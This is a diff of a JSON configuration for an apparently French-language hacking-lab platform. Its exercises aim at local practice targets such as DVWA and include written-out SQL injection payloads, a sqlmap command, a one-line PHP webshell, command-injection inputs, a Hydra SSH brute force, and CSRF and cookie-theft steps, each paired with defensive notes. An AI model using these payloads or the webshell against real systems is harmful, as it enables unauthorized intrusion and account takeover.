@@ -8,8 +8,16 @@
       "category": "network",
       "time": "20 min",
       "machines": [
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "Ou make shell" },
-        { "name": "Cible vuln-network", "url": "#", "note": "Depuis l'attaquant : ssh root@vuln-network" }
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "Ou make shell"
+        },
+        {
+          "name": "Cible vuln-network",
+          "url": "#",
+          "note": "Depuis l'attaquant : ssh root@vuln-network"
+        }
       ],
       "tasks": [
         {
@@ -50,35 +58,44 @@
       "difficulty": "Easy",
       "category": "web",
       "time": "25 min",
+      "howto": "Tu utilises 2 choses : (1) DVWA dans le navigateur – bouton « Ouvrir DVWA (navigateur) » ci-dessous ; (2) le terminal attaquant – bouton Panneau ou PiP pour sqlmap à l'étape 4. Étapes 1 à 3 = dans l'onglet DVWA ; étape 4 = dans le terminal à droite.",
       "machines": [
-        { "name": "DVWA", "urlKey": "dvwa", "note": "admin / password puis Create/Reset Database" },
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "Ou make shell" }
+        {
+          "name": "DVWA",
+          "urlKey": "dvwa",
+          "note": "admin / password puis Create/Reset Database"
+        },
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "Panneau, PiP ou nouvel onglet – sqlmap, curl"
+        }
       ],
       "tasks": [
         {
-          "title": "Préparer DVWA",
-          "content": "Ouvre le lien DVWA ci-dessus (même port que la plateforme). Connecte-toi avec admin / password. En bas de page, clique sur « Create / Reset Database ». Va dans le menu « SQL Injection » et mets le niveau sur « Low ».",
+          "title": "1. Préparer DVWA (dans le navigateur)",
+          "content": "Ouvre DVWA avec le bouton « Ouvrir DVWA (navigateur) » ci-dessus. Dans l'onglet : connecte-toi admin / password, clique « Create / Reset Database », puis menu « SQL Injection », niveau « Low ». Tout dans le navigateur, pas le terminal.",
           "command": null,
           "tip": "Low = aucune protection, pour apprendre. Medium/High ajoutent des filtres à contourner.",
           "learn": "Les niveaux de difficulté simulent des protections (échappement, requêtes préparées). En prod, il faut toujours des requêtes préparées."
         },
         {
-          "title": "Comprendre la requête",
+          "title": "2. Comprendre la requête (dans DVWA)",
           "content": "Dans SQL Injection, entre 1 dans le champ et valide. Regarde l’URL : id=1. Le serveur fait sans doute une requête du type SELECT * FROM users WHERE id = '1'. Si tu mets 1' OR '1'='1, la condition devient toujours vraie.",
           "command": null,
           "tip": "En Low, tu peux modifier l’URL directement : ...?id=1' OR '1'='1&Submit=Submit",
           "learn": "L’injection SQL repose sur « casser » la syntaxe de la requête pour en ajouter une autre (UNION SELECT) ou modifier la logique (OR '1'='1')."
         },
         {
-          "title": "Tester l’injection manuelle",
+          "title": "3. Tester l'injection manuelle (dans DVWA)",
           "content": "Dans le champ, entre : 1' OR '1'='1 puis valide. Tu devrais voir plusieurs lignes (tous les users). Si ça ne marche pas, essaie 1' OR 1=1 -- (le -- commente la fin de la requête).",
           "command": null,
           "tip": "Les guillemets dépendent du code : parfois id='1' parfois id=1. Teste avec et sans guillemets.",
           "learn": "Chaque application est différente. Il faut tester plusieurs payloads (guillemets, commentaires --, #)."
         },
         {
-          "title": "Automatiser avec sqlmap (optionnel)",
-          "content": "Depuis l’attaquant, lance sqlmap sur l’URL de la vuln. Tu dois fournir le cookie de session (récupère-le depuis les DevTools du navigateur, onglet Application > Cookies).",
+          "title": "4. Automatiser avec sqlmap (dans le terminal attaquant)",
+          "content": "Ouvre le terminal attaquant (bouton Panneau ou PiP ci-dessus). Dans ce terminal, lance sqlmap. Récupère le cookie (DevTools du navigateur sur l'onglet DVWA : Application > Cookies, PHPSESSID et security=low).",
           "command": "sqlmap -u 'http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=xxx;security=low' --batch",
           "tip": "Remplace xxx par ton vrai PHPSESSID. --batch évite les questions interactives.",
           "learn": "sqlmap teste des centaines de payloads et peut dumper des tables. En audit, on documente la vuln manuelle puis on utilise l’outil pour extraire les données."
@@ -93,8 +110,16 @@
       "category": "network",
       "time": "15 min",
       "machines": [
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "Ou make shell" },
-        { "name": "vuln-network", "url": "#", "note": "Depuis l'attaquant : ssh root@vuln-network" }
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "Ou make shell"
+        },
+        {
+          "name": "vuln-network",
+          "url": "#",
+          "note": "Depuis l'attaquant : ssh root@vuln-network"
+        }
       ],
       "tasks": [
         {
@@ -135,8 +160,16 @@
       "category": "api",
       "time": "20 min",
       "machines": [
-        { "name": "vuln-api", "urlKey": "api", "note": "admin / admin123" },
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "curl, sqlmap" }
+        {
+          "name": "vuln-api",
+          "urlKey": "api",
+          "note": "admin / admin123"
+        },
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "curl, sqlmap"
+        }
       ],
       "tasks": [
         {
@@ -170,7 +203,11 @@
       "category": "web",
       "time": "20 min",
       "machines": [
-        { "name": "DVWA", "urlKey": "dvwa", "note": "admin / password" }
+        {
+          "name": "DVWA",
+          "urlKey": "dvwa",
+          "note": "admin / password"
+        }
       ],
       "tasks": [
         {
@@ -197,8 +234,16 @@
       "category": "stego",
       "time": "15 min",
       "machines": [
-        { "name": "Télécharger l’image", "url": "/challenges/stego/image_stego.jpg", "note": "Sur la plateforme : Défis stégano" },
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "steghide, exiftool, binwalk" }
+        {
+          "name": "Télécharger l’image",
+          "url": "/challenges/stego/image_stego.jpg",
+          "note": "Sur la plateforme : Défis stégano"
+        },
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "steghide, exiftool, binwalk"
+        }
       ],
       "tasks": [
         {
@@ -232,8 +277,16 @@
       "category": "crypto",
       "time": "15 min",
       "machines": [
-        { "name": "Défis crypto", "url": "/challenges/crypto/", "note": "flag_b64.txt et flag.enc" },
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "base64, openssl" }
+        {
+          "name": "Défis crypto",
+          "url": "/challenges/crypto/",
+          "note": "flag_b64.txt et flag.enc"
+        },
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "base64, openssl"
+        }
       ],
       "tasks": [
         {
@@ -260,7 +313,11 @@
       "category": "red",
       "time": "60 min",
       "machines": [
-        { "name": "Toutes les cibles", "url": "#", "note": "Utiliser les rooms par catégorie (liens ci-dessus)" }
+        {
+          "name": "Toutes les cibles",
+          "url": "#",
+          "note": "Utiliser les rooms par catégorie (liens ci-dessus)"
+        }
       ],
       "tasks": [
         {
@@ -294,7 +351,11 @@
       "category": "phishing",
       "time": "15 min",
       "machines": [
-        { "name": "Page de démo phishing", "url": "/demo-phishing.html", "note": "Exemple pédagogique sur cette plateforme" }
+        {
+          "name": "Page de démo phishing",
+          "url": "/demo-phishing.html",
+          "note": "Exemple pédagogique sur cette plateforme"
+        }
       ],
       "tasks": [
         {
@@ -321,7 +382,11 @@
       "category": "forensics",
       "time": "25 min",
       "machines": [
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "tcpdump, tshark" }
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "tcpdump, tshark"
+        }
       ],
       "tasks": [
         {
@@ -348,13 +413,39 @@
       "category": "web",
       "time": "20 min",
       "machines": [
-        { "name": "DVWA", "urlKey": "dvwa", "note": "admin / password" },
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "Pour héberger une page malveillante" }
+        {
+          "name": "DVWA",
+          "urlKey": "dvwa",
+          "note": "admin / password"
+        },
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "Pour héberger une page malveillante"
+        }
       ],
       "tasks": [
-        { "title": "Préparer DVWA", "content": "Connecte-toi à DVWA, va dans « CSRF », niveau Low. Tu vois un formulaire de changement de mot de passe.", "command": null, "tip": "Le token CSRF en Low est prévisible ou absent.", "learn": "CSRF = l’attaquant profite de la session de la victime pour exécuter des actions à son insu." },
-        { "title": "Analyser la requête", "content": "Change le mot de passe et observe la requête (URL ou DevTools). Note les paramètres (password_new, password_conf, etc.).", "command": null, "tip": "En Low, l’URL peut être rejouée telle quelle.", "learn": "Sans token imprévisible, toute requête valide peut être forgée depuis un autre site." },
-        { "title": "Créer une page piège", "content": "Crée une page HTML qui contient un formulaire ou un lien pointant vers l’URL de changement de mot de passe avec les paramètres choisis. Ouvre-la (ou envoie le lien à une « victime » connectée).", "command": null, "tip": "Tu peux utiliser un formulaire auto-submit avec JavaScript.", "learn": "Les défenses : token CSRF, SameSite sur les cookies, vérification Referer/Origin." }
+        {
+          "title": "Préparer DVWA",
+          "content": "Connecte-toi à DVWA, va dans « CSRF », niveau Low. Tu vois un formulaire de changement de mot de passe.",
+          "command": null,
+          "tip": "Le token CSRF en Low est prévisible ou absent.",
+          "learn": "CSRF = l’attaquant profite de la session de la victime pour exécuter des actions à son insu."
+        },
+        {
+          "title": "Analyser la requête",
+          "content": "Change le mot de passe et observe la requête (URL ou DevTools). Note les paramètres (password_new, password_conf, etc.).",
+          "command": null,
+          "tip": "En Low, l’URL peut être rejouée telle quelle.",
+          "learn": "Sans token imprévisible, toute requête valide peut être forgée depuis un autre site."
+        },
+        {
+          "title": "Créer une page piège",
+          "content": "Crée une page HTML qui contient un formulaire ou un lien pointant vers l’URL de changement de mot de passe avec les paramètres choisis. Ouvre-la (ou envoie le lien à une « victime » connectée).",
+          "command": null,
+          "tip": "Tu peux utiliser un formulaire auto-submit avec JavaScript.",
+          "learn": "Les défenses : token CSRF, SameSite sur les cookies, vérification Referer/Origin."
+        }
       ]
     },
     {
@@ -365,13 +456,39 @@
       "category": "web",
       "time": "25 min",
       "machines": [
-        { "name": "DVWA", "urlKey": "dvwa", "note": "admin / password, Create/Reset DB" },
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "Pour créer le fichier PHP" }
+        {
+          "name": "DVWA",
+          "urlKey": "dvwa",
+          "note": "admin / password, Create/Reset DB"
+        },
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "Pour créer le fichier PHP"
+        }
       ],
       "tasks": [
-        { "title": "Accéder au module File Upload", "content": "Dans DVWA, va dans « File Upload », niveau Low. Tu peux uploader une image.", "command": null, "tip": "En Low, l’extension .php peut être acceptée.", "learn": "La validation doit porter sur le type MIME, l’extension, et idéalement le contenu (magic bytes)." },
-        { "title": "Préparer un webshell", "content": "Crée un fichier shell.php contenant <?php system($_GET['cmd']); ?> (ou équivalent). Depuis l’attaquant : echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php.", "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php", "tip": "En lab, on utilise des commandes simples pour la preuve (id, whoami).", "learn": "Un webshell donne un accès en ligne de commande via le navigateur." },
-        { "title": "Uploader et exécuter", "content": "Upload shell.php (renomme en .jpg si besoin pour contourner en Medium). Accède à l’URL du fichier uploadé avec ?cmd=id pour exécuter une commande.", "command": null, "tip": "Le chemin d’upload est souvent /hackable/uploads/ ou indiqué après upload.", "learn": "Toujours stocker les uploads hors de la racine web ou avec des noms imprévisibles." }
+        {
+          "title": "Accéder au module File Upload",
+          "content": "Dans DVWA, va dans « File Upload », niveau Low. Tu peux uploader une image.",
+          "command": null,
+          "tip": "En Low, l’extension .php peut être acceptée.",
+          "learn": "La validation doit porter sur le type MIME, l’extension, et idéalement le contenu (magic bytes)."
+        },
+        {
+          "title": "Préparer un webshell",
+          "content": "Crée un fichier shell.php contenant <?php system($_GET['cmd']); ?> (ou équivalent). Depuis l’attaquant : echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php.",
+          "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
+          "tip": "En lab, on utilise des commandes simples pour la preuve (id, whoami).",
+          "learn": "Un webshell donne un accès en ligne de commande via le navigateur."
+        },
+        {
+          "title": "Uploader et exécuter",
+          "content": "Upload shell.php (renomme en .jpg si besoin pour contourner en Medium). Accède à l’URL du fichier uploadé avec ?cmd=id pour exécuter une commande.",
+          "command": null,
+          "tip": "Le chemin d’upload est souvent /hackable/uploads/ ou indiqué après upload.",
+          "learn": "Toujours stocker les uploads hors de la racine web ou avec des noms imprévisibles."
+        }
       ]
     },
     {
@@ -382,13 +499,39 @@
       "category": "network",
       "time": "20 min",
       "machines": [
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "hydra installé" },
-        { "name": "vuln-network", "url": "#", "note": "ssh root@vuln-network" }
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "hydra installé"
+        },
+        {
+          "name": "vuln-network",
+          "url": "#",
+          "note": "ssh root@vuln-network"
+        }
       ],
       "tasks": [
-        { "title": "Vérifier l’accès SSH", "content": "Depuis l’attaquant : nmap -p 22 vuln-network pour confirmer que le port 22 est ouvert.", "command": "nmap -p 22 vuln-network", "tip": "Le mot de passe du lab est labpassword ; pour l’exercice tu peux utiliser une petite wordlist.", "learn": "Hydra automatise les tentatives de connexion (SSH, HTTP, FTP, etc.)." },
-        { "title": "Créer une petite wordlist", "content": "Crée un fichier passwords.txt avec quelques mots de passe (dont labpassword). Ex : echo -e 'labpassword\nadmin\nroot\npassword' > passwords.txt", "command": "echo -e 'labpassword\\nadmin\\nroot' > /workspace/passwords.txt", "tip": "En pentest réel on utilise rockyou.txt ou des listes ciblées.", "learn": "Une wordlist de qualité augmente les chances sans exploser le nombre de tentatives." },
-        { "title": "Lancer Hydra", "content": "hydra -l root -P passwords.txt ssh://vuln-network -t 4. Une fois le mot de passe trouvé, connecte-toi en SSH pour confirmer.", "command": "hydra -l root -P passwords.txt ssh://vuln-network -t 4", "tip": "-t 4 = 4 tâches parallèles. Adapte selon la cible.", "learn": "Limiter le débit et utiliser des listes raisonnables pour éviter le blocage et les abus." }
+        {
+          "title": "Vérifier l’accès SSH",
+          "content": "Depuis l’attaquant : nmap -p 22 vuln-network pour confirmer que le port 22 est ouvert.",
+          "command": "nmap -p 22 vuln-network",
+          "tip": "Le mot de passe du lab est labpassword ; pour l’exercice tu peux utiliser une petite wordlist.",
+          "learn": "Hydra automatise les tentatives de connexion (SSH, HTTP, FTP, etc.)."
+        },
+        {
+          "title": "Créer une petite wordlist",
+          "content": "Crée un fichier passwords.txt avec quelques mots de passe (dont labpassword). Ex : echo -e 'labpassword\nadmin\nroot\npassword' > passwords.txt",
+          "command": "echo -e 'labpassword\\nadmin\\nroot' > /workspace/passwords.txt",
+          "tip": "En pentest réel on utilise rockyou.txt ou des listes ciblées.",
+          "learn": "Une wordlist de qualité augmente les chances sans exploser le nombre de tentatives."
+        },
+        {
+          "title": "Lancer Hydra",
+          "content": "hydra -l root -P passwords.txt ssh://vuln-network -t 4. Une fois le mot de passe trouvé, connecte-toi en SSH pour confirmer.",
+          "command": "hydra -l root -P passwords.txt ssh://vuln-network -t 4",
+          "tip": "-t 4 = 4 tâches parallèles. Adapte selon la cible.",
+          "learn": "Limiter le débit et utiliser des listes raisonnables pour éviter le blocage et les abus."
+        }
       ]
     },
     {
@@ -399,12 +542,32 @@
       "category": "web",
       "time": "15 min",
       "machines": [
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "nikto" },
-        { "name": "DVWA ou autre", "urlKey": "dvwa", "note": "Cible web" }
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "nikto"
+        },
+        {
+          "name": "DVWA ou autre",
+          "urlKey": "dvwa",
+          "note": "Cible web"
+        }
       ],
       "tasks": [
-        { "title": "Lancer Nikto sur une cible", "content": "Depuis l’attaquant : nikto -h http://dvwa. Tu peux remplacer dvwa par juice-shop ou bwapp (même réseau).", "command": "nikto -h http://dvwa", "tip": "Nikto teste des milliers d’URLs et en-têtes. La sortie peut être longue.", "learn": "Nikto est un scanner générique ; il faut trier les vrais positifs des faux positifs." },
-        { "title": "Interpréter les résultats", "content": "Repère les lignes « + » (trouvées) : répertoires sensibles, versions, options dangereuses. Note ce qui pourrait être exploitable (ex: /phpmyadmin, /admin).", "command": null, "tip": "Export avec -o pour garder un rapport : nikto -h http://dvwa -o report.html", "learn": "Un bon rapport de scan cite les preuves et les recommandations par finding." }
+        {
+          "title": "Lancer Nikto sur une cible",
+          "content": "Depuis l’attaquant : nikto -h http://dvwa. Tu peux remplacer dvwa par juice-shop ou bwapp (même réseau).",
+          "command": "nikto -h http://dvwa",
+          "tip": "Nikto teste des milliers d’URLs et en-têtes. La sortie peut être longue.",
+          "learn": "Nikto est un scanner générique ; il faut trier les vrais positifs des faux positifs."
+        },
+        {
+          "title": "Interpréter les résultats",
+          "content": "Repère les lignes « + » (trouvées) : répertoires sensibles, versions, options dangereuses. Note ce qui pourrait être exploitable (ex: /phpmyadmin, /admin).",
+          "command": null,
+          "tip": "Export avec -o pour garder un rapport : nikto -h http://dvwa -o report.html",
+          "learn": "Un bon rapport de scan cite les preuves et les recommandations par finding."
+        }
       ]
     },
     {
@@ -415,11 +578,27 @@
       "category": "osint",
       "time": "20 min",
       "machines": [
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "theHarvester (pip)" }
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "theHarvester (pip)"
+        }
       ],
       "tasks": [
-        { "title": "Lancer theHarvester", "content": "theHarvester -d example.com -b bing (ou -b google, duckduckgo). -d = domaine cible. En lab tu peux utiliser un domaine public.", "command": "theHarvester -d example.com -b bing", "tip": "Certaines sources nécessitent des clés API. Bing/DuckDuckGo fonctionnent souvent sans.", "learn": "OSINT = Open Source Intelligence : tout ce qui est public peut servir à préparer une attaque." },
-        { "title": "Exploiter les résultats", "content": "Note les emails, sous-domaines et IPs trouvés. Ces infos servent au phishing, à l’énumération ou au ciblage de services.", "command": null, "tip": "Export en JSON avec -f resultat.json pour réutiliser les données.", "learn": "La phase OSINT est cruciale : plus tu en sais sur la cible, plus tes attaques sont ciblées." }
+        {
+          "title": "Lancer theHarvester",
+          "content": "theHarvester -d example.com -b bing (ou -b google, duckduckgo). -d = domaine cible. En lab tu peux utiliser un domaine public.",
+          "command": "theHarvester -d example.com -b bing",
+          "tip": "Certaines sources nécessitent des clés API. Bing/DuckDuckGo fonctionnent souvent sans.",
+          "learn": "OSINT = Open Source Intelligence : tout ce qui est public peut servir à préparer une attaque."
+        },
+        {
+          "title": "Exploiter les résultats",
+          "content": "Note les emails, sous-domaines et IPs trouvés. Ces infos servent au phishing, à l’énumération ou au ciblage de services.",
+          "command": null,
+          "tip": "Export en JSON avec -f resultat.json pour réutiliser les données.",
+          "learn": "La phase OSINT est cruciale : plus tu en sais sur la cible, plus tes attaques sont ciblées."
+        }
       ]
     },
     {
@@ -430,12 +609,32 @@
       "category": "web",
       "time": "20 min",
       "machines": [
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "gobuster" },
-        { "name": "DVWA ou vuln-api", "urlKey": "dvwa", "note": "Cible" }
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "gobuster"
+        },
+        {
+          "name": "DVWA ou vuln-api",
+          "urlKey": "dvwa",
+          "note": "Cible"
+        }
       ],
       "tasks": [
-        { "title": "Installer / lancer Gobuster", "content": "gobuster dir -u http://dvwa -w /usr/share/wordlists/dirb/common.txt -t 20. -u = URL de base, -w = wordlist, -t = threads.", "command": "gobuster dir -u http://dvwa -w /usr/share/wordlists/dirb/common.txt -t 20", "tip": "Si dirb/common.txt n’existe pas, utilise une petite wordlist (ex: admin, login, backup).", "learn": "La découverte de répertoires révèle des panneaux d’admin, des backups ou des fichiers de config." },
-        { "title": "Analyser les réponses", "content": "Gobuster affiche les codes HTTP (200, 301, 403). Les 200/301 indiquent des chemins existants. Visite-les dans le navigateur pour voir le contenu.", "command": null, "tip": "Filtre les tailles de réponse avec -b pour ignorer les 404 de même taille.", "learn": "En pentest, on documente chaque endpoint découvert pour la suite du test." }
+        {
+          "title": "Installer / lancer Gobuster",
+          "content": "gobuster dir -u http://dvwa -w /usr/share/wordlists/dirb/common.txt -t 20. -u = URL de base, -w = wordlist, -t = threads.",
+          "command": "gobuster dir -u http://dvwa -w /usr/share/wordlists/dirb/common.txt -t 20",
+          "tip": "Si dirb/common.txt n’existe pas, utilise une petite wordlist (ex: admin, login, backup).",
+          "learn": "La découverte de répertoires révèle des panneaux d’admin, des backups ou des fichiers de config."
+        },
+        {
+          "title": "Analyser les réponses",
+          "content": "Gobuster affiche les codes HTTP (200, 301, 403). Les 200/301 indiquent des chemins existants. Visite-les dans le navigateur pour voir le contenu.",
+          "command": null,
+          "tip": "Filtre les tailles de réponse avec -b pour ignorer les 404 de même taille.",
+          "learn": "En pentest, on documente chaque endpoint découvert pour la suite du test."
+        }
       ]
     },
     {
@@ -446,12 +645,32 @@
       "category": "web",
       "time": "20 min",
       "machines": [
-        { "name": "DVWA", "urlKey": "dvwa", "note": "Command Injection, niveau Low" },
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "Pour comprendre les payloads" }
+        {
+          "name": "DVWA",
+          "urlKey": "dvwa",
+          "note": "Command Injection, niveau Low"
+        },
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "Pour comprendre les payloads"
+        }
       ],
       "tasks": [
-        { "title": "Accéder au module", "content": "Dans DVWA, va dans « Command Injection », niveau Low. Tu as un champ qui exécute probablement ping.", "command": null, "tip": "En Low, la chaîne est concaténée telle quelle à la commande.", "learn": "Commande typique côté serveur : exec('ping -c 4 ' . $_GET['ip']); il suffit d’ajouter ; ou | pour une autre commande." },
-        { "title": "Tester l’injection", "content": "Entre 127.0.0.1; id ou 127.0.0.1 | whoami. Si tu vois la sortie de id/whoami, l’injection fonctionne.", "command": null, "tip": "Selon l’OS : ; ou & ou | ou &&. Sur Windows : & ou |.", "learn": "Ne jamais passer d’entrée utilisateur non sanitized à system(), exec(), passthru(), etc." }
+        {
+          "title": "Accéder au module",
+          "content": "Dans DVWA, va dans « Command Injection », niveau Low. Tu as un champ qui exécute probablement ping.",
+          "command": null,
+          "tip": "En Low, la chaîne est concaténée telle quelle à la commande.",
+          "learn": "Commande typique côté serveur : exec('ping -c 4 ' . $_GET['ip']); il suffit d’ajouter ; ou | pour une autre commande."
+        },
+        {
+          "title": "Tester l’injection",
+          "content": "Entre 127.0.0.1; id ou 127.0.0.1 | whoami. Si tu vois la sortie de id/whoami, l’injection fonctionne.",
+          "command": null,
+          "tip": "Selon l’OS : ; ou & ou | ou &&. Sur Windows : & ou |.",
+          "learn": "Ne jamais passer d’entrée utilisateur non sanitized à system(), exec(), passthru(), etc."
+        }
       ]
     },
     {
@@ -462,12 +681,32 @@
       "category": "web",
       "time": "15 min",
       "machines": [
-        { "name": "DVWA", "urlKey": "dvwa", "note": "admin / password" },
-        { "name": "DevTools navigateur", "url": "#", "note": "Application > Cookies" }
+        {
+          "name": "DVWA",
+          "urlKey": "dvwa",
+          "note": "admin / password"
+        },
+        {
+          "name": "DevTools navigateur",
+          "url": "#",
+          "note": "Application > Cookies"
+        }
       ],
       "tasks": [
-        { "title": "Identifier le cookie de session", "content": "Connecte-toi à DVWA. Ouvre les DevTools (F12), onglet Application (ou Storage), section Cookies. Repère le cookie (ex: PHPSESSID).", "command": null, "tip": "Ce cookie est envoyé à chaque requête ; sans lui tu serais déconnecté.", "learn": "HttpOnly limite l’accès au cookie par JavaScript (réduit le vol via XSS)." },
-        { "title": "Simuler un vol", "content": "Copie la valeur du cookie. Ouvre une fenêtre de navigation privée (ou un autre navigateur), va sur DVWA, injecte le cookie (extension ou DevTools). Tu es connecté comme la victime.", "command": null, "tip": "En conditions réelles, l’attaquant récupère le cookie via XSS (document.cookie) ou MITM.", "learn": "HTTPS + HttpOnly + SameSite renforcent la sécurité des sessions." }
+        {
+          "title": "Identifier le cookie de session",
+          "content": "Connecte-toi à DVWA. Ouvre les DevTools (F12), onglet Application (ou Storage), section Cookies. Repère le cookie (ex: PHPSESSID).",
+          "command": null,
+          "tip": "Ce cookie est envoyé à chaque requête ; sans lui tu serais déconnecté.",
+          "learn": "HttpOnly limite l’accès au cookie par JavaScript (réduit le vol via XSS)."
+        },
+        {
+          "title": "Simuler un vol",
+          "content": "Copie la valeur du cookie. Ouvre une fenêtre de navigation privée (ou un autre navigateur), va sur DVWA, injecte le cookie (extension ou DevTools). Tu es connecté comme la victime.",
+          "command": null,
+          "tip": "En conditions réelles, l’attaquant récupère le cookie via XSS (document.cookie) ou MITM.",
+          "learn": "HTTPS + HttpOnly + SameSite renforcent la sécurité des sessions."
+        }
       ]
     },
     {
@@ -478,12 +717,32 @@
       "category": "web",
       "time": "15 min",
       "machines": [
-        { "name": "DVWA ou vuln-api", "urlKey": "dvwa", "note": "Cible" },
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "curl" }
+        {
+          "name": "DVWA ou vuln-api",
+          "urlKey": "dvwa",
+          "note": "Cible"
+        },
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "curl"
+        }
       ],
       "tasks": [
-        { "title": "Copier une requête en cURL", "content": "Dans le navigateur, ouvre DevTools > Network. Effectue une action (ex: login DVWA). Clic droit sur la requête > Copy > Copy as cURL.", "command": null, "tip": "Colle dans un terminal (hôte ou attaquant) pour rejouer. Adapte l’URL si tu es dans le conteneur (dvwa au lieu de localhost).", "learn": "Rejouer des requêtes permet de tester des payloads sans refaire tout le parcours." },
-        { "title": "Modifier et rejouer", "content": "Modifie le corps ou les paramètres dans la ligne cURL (ex: change le mot de passe, l’id utilisateur). Exécute. Tu simules ce que fait un proxy comme Burp.", "command": "curl -X POST http://dvwa/login -d 'username=admin&password=test' -H 'Content-Type: application/x-www-form-urlencoded'", "tip": "Pour les cookies, ajoute -b 'PHPSESSID=xxx'.", "learn": "L’automatisation (scripts, Burp Intruder) repose sur la relecture de requêtes modifiées." }
+        {
+          "title": "Copier une requête en cURL",
+          "content": "Dans le navigateur, ouvre DevTools > Network. Effectue une action (ex: login DVWA). Clic droit sur la requête > Copy > Copy as cURL.",
+          "command": null,
+          "tip": "Colle dans un terminal (hôte ou attaquant) pour rejouer. Adapte l’URL si tu es dans le conteneur (dvwa au lieu de localhost).",
+          "learn": "Rejouer des requêtes permet de tester des payloads sans refaire tout le parcours."
+        },
+        {
+          "title": "Modifier et rejouer",
+          "content": "Modifie le corps ou les paramètres dans la ligne cURL (ex: change le mot de passe, l’id utilisateur). Exécute. Tu simules ce que fait un proxy comme Burp.",
+          "command": "curl -X POST http://dvwa/login -d 'username=admin&password=test' -H 'Content-Type: application/x-www-form-urlencoded'",
+          "tip": "Pour les cookies, ajoute -b 'PHPSESSID=xxx'.",
+          "learn": "L’automatisation (scripts, Burp Intruder) repose sur la relecture de requêtes modifiées."
+        }
       ]
     },
     {
@@ -494,11 +753,27 @@
       "category": "network",
       "time": "20 min",
       "machines": [
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "dig, nslookup, theHarvester" }
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "dig, nslookup, theHarvester"
+        }
       ],
       "tasks": [
-        { "title": "Requêtes DNS de base", "content": "dig example.com A et dig example.com MX. Note les IP et les serveurs mail. dig example.com ANY pour tout type.", "command": "dig example.com A\n dig example.com MX", "tip": "En lab Docker les noms sont résolus par le réseau interne ; pour un vrai domaine utilise un nom public.", "learn": "DNS révèle des serveurs, des sous-domaines et parfois des infos de configuration." },
-        { "title": "Sous-domaines avec theHarvester", "content": "theHarvester -d example.com -b dnsdumpster (ou bing). Les sous-domaines trouvés peuvent être des cibles (dev., admin., api.).", "command": "theHarvester -d example.com -b bing", "tip": "Combine avec des wordlists (subdomains.txt) pour du brute force de sous-domaines.", "learn": "Un sous-domaine oublié peut être moins sécurisé que le domaine principal." }
+        {
+          "title": "Requêtes DNS de base",
+          "content": "dig example.com A et dig example.com MX. Note les IP et les serveurs mail. dig example.com ANY pour tout type.",
+          "command": "dig example.com A\n dig example.com MX",
+          "tip": "En lab Docker les noms sont résolus par le réseau interne ; pour un vrai domaine utilise un nom public.",
+          "learn": "DNS révèle des serveurs, des sous-domaines et parfois des infos de configuration."
+        },
+        {
+          "title": "Sous-domaines avec theHarvester",
+          "content": "theHarvester -d example.com -b dnsdumpster (ou bing). Les sous-domaines trouvés peuvent être des cibles (dev., admin., api.).",
+          "command": "theHarvester -d example.com -b bing",
+          "tip": "Combine avec des wordlists (subdomains.txt) pour du brute force de sous-domaines.",
+          "learn": "Un sous-domaine oublié peut être moins sécurisé que le domaine principal."
+        }
       ]
     },
     {
@@ -509,13 +784,39 @@
       "category": "network",
       "time": "25 min",
       "machines": [
-        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "tcpdump, tshark" },
-        { "name": "vuln-api", "url": "#", "note": "Cible pour générer du trafic" }
+        {
+          "name": "Terminal attaquant",
+          "urlKey": "terminal",
+          "note": "tcpdump, tshark"
+        },
+        {
+          "name": "vuln-api",
+          "url": "#",
+          "note": "Cible pour générer du trafic"
+        }
       ],
       "tasks": [
-        { "title": "Lancer une capture tcpdump", "content": "Depuis l’attaquant, lance tcpdump -i any -w /workspace/cap.pcap host vuln-api. Garde la commande en cours.", "command": "tcpdump -i any -w /workspace/cap.pcap host vuln-api", "tip": "Lance dans un terminal (ou en arrière-plan avec &).", "learn": "tcpdump permet de capturer tout le trafic sur une interface (ou any)." },
